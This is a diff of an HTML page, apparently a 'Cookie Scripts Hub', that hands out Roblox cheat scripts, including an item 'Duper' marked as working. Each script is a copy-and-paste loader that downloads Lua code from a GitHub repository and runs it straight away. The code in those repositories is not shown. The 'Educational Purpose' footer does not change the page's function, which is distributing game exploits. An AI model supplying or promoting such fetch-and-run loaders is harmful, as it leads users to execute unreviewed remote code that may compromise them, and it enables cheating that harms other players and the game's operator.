@@ -1,140 +1,171 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cookie Script</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cookie Scripts</title>
 
-<style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: linear-gradient(180deg, #0b0f1a, #070a12);
-  color: white;
-}
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #0d0d0d;
+      color: #fff;
+    }
 
-header {
-  text-align: center;
-  padding: 24px 16px;
-}
+    header {
+      padding: 20px;
+      text-align: center;
+      background: #111;
+      border-bottom: 1px solid #222;
+    }
 
-header h1 {
-  margin: 0;
-  font-size: 28px;
-}
+    header h1 {
+      margin: 0;
+      color: #ffb703;
+    }
 
-header p {
-  opacity: 0.8;
-  margin-top: 6px;
-}
+    .container {
+      max-width: 900px;
+      margin: auto;
+      padding: 20px;
+    }
 
-.container {
-  padding: 16px;
-}
+    .script-box {
+      background: #151515;
+      border: 1px solid #222;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
 
-.card {
-  background: #11162a;
-  border-radius: 14px;
-  padding: 16px;
-  box-shadow: 0 0 25px rgba(108,92,255,0.15);
-}
+    .script-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
 
-.card h2 {
-  margin: 0 0 6px 0;
-}
+    .status {
+      display: inline-block;
+      padding: 5px 10px;
+      border-radius: 6px;
+      font-size: 13px;
+      margin-bottom: 10px;
+    }
 
-.status {
-  color: #3cff8a;
-  font-weight: bold;
-}
+    .working {
+      background: #1b5e20;
+      color: #8aff8a;
+    }
 
-.counter {
-  margin-top: 6px;
-  opacity: 0.85;
-  font-size: 14px;
-}
+    .patched {
+      background: #5e1b1b;
+      color: #ff8a8a;
+    }
 
-textarea {
-  margin-top: 12px;
-  width: 100%;
-  height: 90px;
-  background: #0b0f1a;
-  color: #8ab4ff;
-  border: 1px solid #2a2f55;
-  border-radius: 10px;
-  padding: 12px;
-  resize: none;
-  font-size: 13px;
-}
+    pre {
+      background: #0b0b0b;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-size: 13px;
+      margin-top: 10px;
+    }
 
-button {
-  margin-top: 14px;
-  width: 100%;
-  padding: 14px;
-  background: #6c5cff;
-  border: none;
-  border-radius: 12px;
-  color: white;
-  font-size: 16px;
-  font-weight: bold;
-}
-button:active {
-  transform: scale(0.97);
-}
-</style>
+    button {
+      margin-top: 10px;
+      padding: 10px 16px;
+      border: none;
+      border-radius: 6px;
+      background: #ffb703;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: 0.85;
+    }
+
+    .stats {
+      margin-top: 8px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    footer {
+      text-align: center;
+      padding: 15px;
+      color: #777;
+      font-size: 13px;
+    }
+  </style>
 </head>
 
 <body>
 
 <header>
-  <h1>🍪 Cookie Scripts</h1>
-  <p>Verified & friendly scripts</p>
+  <h1>🍪 Cookie Scripts Hub</h1>
+  <p>Roblox Scripts • Status Based</p>
 </header>
 
 <div class="container">
 
-  <div class="card">
-    <h2>🌊 Escape Tsunami For Brainrot Duper</h2>
-    <div>Status: <span class="status">WORKING</span></div>
-    <div class="counter">📋 Copied: <span id="count">Loading...</span></div>
+  <!-- PATCHED SCRIPT -->
+  <div class="script-box">
+    <div class="script-title">Escape Tsunami For Brainrot</div>
+    <span class="status patched">Patched / Outdated</span>
 
-    <textarea id="script" readonly>
+    <pre>
 loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/lxdyzhub/refs/heads/main/lxdyzhub.lua"))()
-    </textarea>
+    </pre>
+
+    <div class="stats">
+      ❌ Script is no longer working
+    </div>
+  </div>
+
+  <!-- WORKING SCRIPT -->
+  <div class="script-box">
+    <div class="script-title">Cookie Scripts Duper</div>
+    <span class="status working">Working</span>
+
+    <pre id="scriptCode">
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()
+    </pre>
 
     <button onclick="copyScript()">📋 Copy Script</button>
+
+    <div class="stats">
+      👁️ Views: <span id="views">0</span> |
+      📥 Copied: <span id="copies">0</span>
+    </div>
   </div>
 
 </div>
 
+<footer>
+  © 2026 Cookie Scripts • Educational Purpose
+</footer>
+
 <script>
-const NAMESPACE = "cookie-script";
-const KEY = "escape-tsunami-brainrot";
+  let views = localStorage.getItem("views") || 0;
+  let copies = localStorage.getItem("copies") || 0;
 
-// load count
-fetch(`https://api.countapi.xyz/get/${NAMESPACE}/${KEY}`)
-  .then(res => res.json())
-  .then(data => {
-    document.getElementById("count").innerText = data.value;
-  })
-  .catch(() => {
-    document.getElementById("count").innerText = "0";
-  });
+  views++;
+  localStorage.setItem("views", views);
 
-function copyScript() {
-  const text = document.getElementById("script");
-  text.select();
-  document.execCommand("copy");
+  document.getElementById("views").innerText = views;
+  document.getElementById("copies").innerText = copies;
 
-  // increase count
-  fetch(`https://api.countapi.xyz/hit/${NAMESPACE}/${KEY}`)
-    .then(res => res.json())
-    .then(data => {
-      document.getElementById("count").innerText = data.value;
-    });
-
-  alert("Script copied!");
-}
+  function copyScript() {
+    const text = document.getElementById("scriptCode").innerText;
+    navigator.clipboard.writeText(text);
+    copies++;
+    localStorage.setItem("copies", copies);
+    document.getElementById("copies").innerText = copies;
+    alert("Script copied!");
+  }
 </script>
 
 </body>
